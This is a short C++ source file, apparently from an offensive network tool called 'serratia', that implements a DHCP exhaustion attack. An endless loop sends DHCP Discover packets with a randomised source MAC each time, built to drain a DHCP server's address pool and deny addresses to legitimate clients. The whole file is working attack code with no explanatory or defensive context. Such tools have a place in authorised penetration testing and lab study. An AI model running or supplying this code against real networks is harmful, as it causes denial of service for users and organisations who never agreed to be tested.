#include "DHCPExhaustion.h"

#include <pcapplusplus/EthLayer.h>

#include "../utilities/MACUtils.h"

void DHCPExhaustion::run() {
  auto packet = serratia::protocols::buildDHCPDiscover(config_);
  while (true) {
    auto eth_layer = packet.getLayerOfType<pcpp::EthLayer>();
    eth_layer->setSourceMac(serratia::utils::randomize_mac());
    send_dev_->sendPacket(*(packet.getRawPacket()));
    sleep(1);
  }
}